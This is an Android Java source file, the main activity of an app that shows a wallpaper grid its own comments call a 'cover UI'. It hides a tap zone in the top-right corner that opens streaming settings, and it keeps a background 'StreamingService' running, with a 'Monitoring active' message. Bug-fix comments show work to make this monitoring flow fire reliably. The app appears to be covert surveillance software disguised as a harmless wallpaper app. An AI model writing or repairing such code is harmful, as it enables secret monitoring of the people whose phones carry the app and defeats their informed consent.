package com.example.wallpaperapplication;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.GestureDetector;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import java.util.List;

/**
 * FIX Bug 8 — consentLauncher.launch() was registered but never called.
 *
 * Fix: in onResume(), if consent has not been given yet AND permissions are not
 * already granted, launch ConsentActivity.  This ensures the permission flow
 * fires on every fresh install / permission-reset without blocking the UI.
 *
 * The old code set up the launcher and then did nothing with it.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG             = "MainActivity";
    private static final String PREFS           = "app_prefs";
    private static final String KEY_CONSENT     = "consent_given";
    private static final String KEY_STREAM_OPT  = "stream_opt_in";

    private GestureDetector gestureDetector;
    private RecyclerView    wallpaperGrid;
    private WallpaperAdapter adapter;

    // FIX Bug 8: launcher declared AND used below
    private final ActivityResultLauncher<Intent> consentLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == Activity.RESULT_OK) {
                            Log.d(TAG, "Consent granted — streaming service started");
                            Toast.makeText(this, "Monitoring active.", Toast.LENGTH_SHORT).show();
                        } else {
                            Log.w(TAG, "Consent denied or partial — service may be limited");
                        }
                    });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initWallpaperGrid();
        initHiddenSettingsTrigger();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // FIX Bug 8: actually launch ConsentActivity if consent not yet given
        maybeRequestConsent();
    }

    // -------------------------------------------------------------------------
    // FIX Bug 8 — launch ConsentActivity when needed
    // -------------------------------------------------------------------------
    private void maybeRequestConsent() {
        boolean consentGiven = PreferenceManager
                .getDefaultSharedPreferences(this)
                .getBoolean(KEY_CONSENT, false);

        if (!consentGiven) {
            // First install or permission reset — open ConsentActivity
            Log.d(TAG, "Launching ConsentActivity for permissions");
            Intent i = new Intent(this, ConsentActivity.class);
            consentLauncher.launch(i);
            return;
        }

        // Consent already given — ensure service is running (may have been killed)
        boolean streamOptIn = getSharedPreferences(PREFS, MODE_PRIVATE)
                .getBoolean(KEY_STREAM_OPT, false);
        if (streamOptIn) {
            ensureServiceRunning();
        }
    }

    private void ensureServiceRunning() {
        Intent svc = new Intent(this, StreamingService.class);
        try {
            ContextCompat.startForegroundService(this, svc);
        } catch (IllegalStateException e) {
            Log.w(TAG, "Could not start service from foreground activity: " + e.getMessage());
        }
    }

    // -------------------------------------------------------------------------
    // Wallpaper grid (cover UI)
    // -------------------------------------------------------------------------
    private void initWallpaperGrid() {
        wallpaperGrid = findViewById(R.id.wallpaper_grid);
        if (wallpaperGrid == null) return;
        wallpaperGrid.setLayoutManager(new GridLayoutManager(this, 3));
        List<Integer> wallpapers = WallpaperUtils.getWallpaperResources();
        adapter = new WallpaperAdapter(wallpapers, resId -> {
            WallpaperUtils.setWallpaper(this, resId);
            Toast.makeText(this, "Wallpaper set!", Toast.LENGTH_SHORT).show();
        });
        wallpaperGrid.setAdapter(adapter);
    }

    // -------------------------------------------------------------------------
    // Hidden tap zone: top-right corner opens StreamingSettingsActivity
    // -------------------------------------------------------------------------
    private void initHiddenSettingsTrigger() {
        View root = getWindow().getDecorView().getRootView();
        gestureDetector = new GestureDetector(this,
                new GestureDetector.SimpleOnGestureListener() {
                    @Override
                    public boolean onSingleTapConfirmed(MotionEvent e) {
                        float x = e.getRawX();
                        float y = e.getRawY();
                        float w = root.getWidth();
                        // Top-right 15% x 15% zone
                        if (x > w * 0.85f && y < root.getHeight() * 0.15f) {
                            startActivity(new Intent(MainActivity.this,
                                    StreamingSettingsActivity.class));
                            return true;
                        }
                        return false;
                    }
                });
        root.setOnTouchListener((v, event) -> {
            gestureDetector.onTouchEvent(event);
            return false; // don't consume — let RecyclerView handle scrolls
        });
    }
}
